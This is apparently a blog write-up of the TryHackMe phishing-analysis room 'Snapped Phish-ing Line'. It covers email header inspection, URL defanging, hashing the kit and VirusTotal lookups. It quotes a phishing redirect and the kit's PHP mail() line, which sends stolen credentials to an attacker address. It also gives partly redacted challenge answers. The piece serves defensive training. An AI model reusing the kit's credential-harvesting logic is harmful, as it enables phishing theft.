---
layout: post
title: "TryHackMe: Snapped Phish-ing Line"
date: 2026-01-14 14:30:00 +00:00
categories: [tryhackme]
tags: [phishing, email-analysis, osint, virustotal, SOC L1]
media_subpath: /images/snapped-phish-ing-line
render_with_liquid: false
image:
  path: room.webp
---

Room: [Snapped Phish-ing Line](https://tryhackme.com/room/snappedphishingline)

## Scenario

SwiftSpend Financial employees reported suspicious emails. Some users already submitted credentials and could no longer log in.  
Goal: analyze the phishing emails + URLs, retrieve the phishing kit, and gather CTI about the adversary.

> Interaction with phishing artifacts must be done only inside the TryHackMe VM.  
> {: .prompt-tip }

---

## Tools Used

- Linux CLI (`grep`, `sha256sum`, `unzip`)
- Firefox (URL inspection)
- CyberChef (defang + decode)
- VirusTotal (CTI)

---

## Questions and Analysis

### Who is the individual who received an email attachment containing a PDF?

The phishing emails are stored under:

`~/Desktop/phish-emails/`

I reviewed all mail samples and noticed:

- **Only one email contains a `.pdf` attachment**
- The remaining phishing emails contain a **`.html` attachment**

After identifying the email with the PDF attachment, I inspected its **email header** and extracted the recipient from the `To:` field.

![email-from-to](email-from-to.png)

`[REDACTED]`

---

### What email address was used by the adversary to send the phishing emails?

I opened the email that contains the PDF attachment (same one from Q1).  
Then I inspected the **email header** and extracted the sender from the `From:` field.

![email-from-to](email-from-to.png)

`[RED@CTED]`

---

### What is the redirection URL to the phishing page for the individual Zoe Duncan? (defanged format)

To locate the phishing redirection, I inspected the phishing page / kit HTML source code.  
The redirect URL is defined inside:

`<meta http-equiv="refresh">`

```html
<!DOCTYPE html>
<html>
  <head>
    <title>Redirecting. . .</title>
    <meta
      http-equiv="refresh"
      content="0;URL='http://[REDACTED]/?email=zoe.duncan@swiftspend.finance&error'"
    />
  </head>
</html>
```

Then I used CyberChef to defang the URL safely:

![phishing-url-cyberchef-defand](phishing-url-cyberchef-defand.png)

`hxxp[://][REDACTED]/?email=zoe[.]duncan@swiftspend[.]finance&error`

---

### What is the URL to the .zip archive of the phishing kit? (defanged format)

From the redirect URL, I reached a fake Office365 login page:

![fake-login](fake-login.png)

By exploring the `/data/`[^data-dir] directory, I found:

![data-dir](data-dir.png)

- A folder: `/Update365`[^Update365]
- The phishing kit archive: `Update365.zip`[^Update365-zip]

I located the phishing kit URL by inspecting the browser address bar after navigating to the `/data/` and using CyberChef to defang it:

![zip-url-cyberchef-defand](zip-url-cyberchef-defand.png)

So the phishing kit archive URL is after defanging is like this:  
`hxxp[://][REDACTED]/Update365[.]zip`

---

### What is the SHA256 hash of the phishing kit archive?

I downloaded the ZIP file inside the VM, then verified the SHA256 hash:

```bash
damianhall@ip-10-80-147-92:~/Downloads$ sha256sum Update365.zip
```

Output:

```
ba3c152673934[REDACTED]8fee4d16b19ac9686  Update365.zip
```

I then searched this hash in VirusTotal for CTI enrichment:

![virustotal-zip](virustotal-zip.png)

So the SHA256 hash is like this:  
`ba3c152673934[REDACTED]8fee4d16b19ac9686`

---

### When was the phishing kit archive first submitted? (format: YYYY-MM-DD HH:MM:SS UTC)

In VirusTotal, I checked the file submission timeline for the ZIP archive hash.  
The first submission timestamp is:

![first-submission](first-submission.png)

`[REDA-CT-ED]`

---

### When was the SSL certificate the phishing domain used to host the phishing kit archive first logged? (format: YYYY-MM-DD)

The SSL certificate information was not reliably available in this challenge environment.  
Therefore, I used the room hint provided in the task.

![ssl-cert-hint](ssl-cert-hint.png)

`[REDA-CT-ED]`

---

### What was the email address of the user who submitted their password twice?

After extracting the phishing kit, I explored the `/Update365`[^Update365] directory and found a `log.txt` file that stores captured credentials.

From the log file, I identified the user who submitted their password twice:

![data-Update365-log.txt](data-Update365-log.txt.png)

[RED@CTED]

---

### What was the email address used by the adversary to collect compromised credentials?

I searched the phishing kit for the credential-exfiltration logic and located it inside `submit.php`.

The script uses PHP `mail()` to send victims' submitted credentials to the adversary email address:

```php
mail("[RED@CTED]", $bron, $message, $lagi);
```

---

### The adversary used other email addresses in the obtained phishing kit. What is the email address that ends in "@gmail.com"?

I found another adversary email in a cleanup script:

```php
$to ="[REDACTED]@gmail.com";
```

I also confirmed this across the kit using `grep`:

```bash
damianhall@ip-10-80-147-92:~/Downloads/Update365$ grep -r -E '@gmail.com'
```

Output:

```
office365/updat.cmd: $to ="[REDACTED]@gmail.com"
office365/updat.cmd: $to ="[REDACTED]@gmail.com"
office365/script.st: $to ="[REDACTED]@gmail.com"
```

`[REDACTED]@gmail.com`

---

### What is the hidden flag?

I followed the hint:

> The flag contains a `.txt` extension and, with some adjustments, should be downloadable from the phishing URL.  
> I noticed that the `/office365` directory looks empty, but I found a file named `flag.txt`. Based on the hint, I tried to access it via the phishing URL, and here we go the secret flag is here.

```
/flag.txt
```

The file content looked like encoded text.  
Using CyberChef:

- Decoded from Base64
- Reversed the text

I recovered the final flag:

![flag.txt-cyberchef-from-base64-reverse](flag.txt-cyberchef-from-base64-reverse.png)

`THM{REDACTED}`

---

# Footnotes

[^data-dir]: The `/data/` directory contains the phishing kit archive and /Update365 directory.
[^Update365-zip]: The `Update365.zip` file is the phishing kit archive.
[^Update365]: The `/Update365` folder contains the log.txt file with captured credentials.
